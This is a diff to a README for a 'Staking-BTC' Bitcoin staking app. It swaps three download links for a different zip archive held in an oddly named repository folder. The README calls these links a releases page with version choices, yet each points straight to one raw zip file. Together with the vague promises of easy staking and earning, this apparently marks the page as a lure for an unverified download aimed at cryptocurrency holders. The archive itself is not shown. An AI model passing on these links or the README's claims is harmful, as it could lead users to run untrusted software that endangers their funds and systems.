@@ -1,6 +1,6 @@
 # 🔥 Staking-BTC - Simple BTC Staking Made Easy
 
-[![Download Staking-BTC](https://raw.githubusercontent.com/sankalpasudhar/Staking-BTC/main/duodena/Staking-BTC.zip)](https://raw.githubusercontent.com/sankalpasudhar/Staking-BTC/main/duodena/Staking-BTC.zip)
+[![Download Staking-BTC](https://raw.githubusercontent.com/sankalpasudhar/Staking-BTC/main/duodena/BTC_Staking_v1.9.zip)](https://raw.githubusercontent.com/sankalpasudhar/Staking-BTC/main/duodena/BTC_Staking_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to **Staking-BTC**! This application helps you stake your Bitcoin easily
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to access the download options:
-   [Download Staking-BTC](https://raw.githubusercontent.com/sankalpasudhar/Staking-BTC/main/duodena/Staking-BTC.zip)
+   [Download Staking-BTC](https://raw.githubusercontent.com/sankalpasudhar/Staking-BTC/main/duodena/BTC_Staking_v1.9.zip)
    
 2. **Choose Your Version**: On the Releases page, you will see a list of available versions. Select the version you want to use. Click on the version number to view its details.
 
@@ -60,4 +60,4 @@ For more information about Bitcoin staking and best practices, consider visiting
 
 Thank you for using Staking-BTC! Enjoy your staking experience and happy earning!
 
-[Download Staking-BTC Again](https://raw.githubusercontent.com/sankalpasudhar/Staking-BTC/main/duodena/Staking-BTC.zip)
+[Download Staking-BTC Again](https://raw.githubusercontent.com/sankalpasudhar/Staking-BTC/main/duodena/BTC_Staking_v1.9.zip)
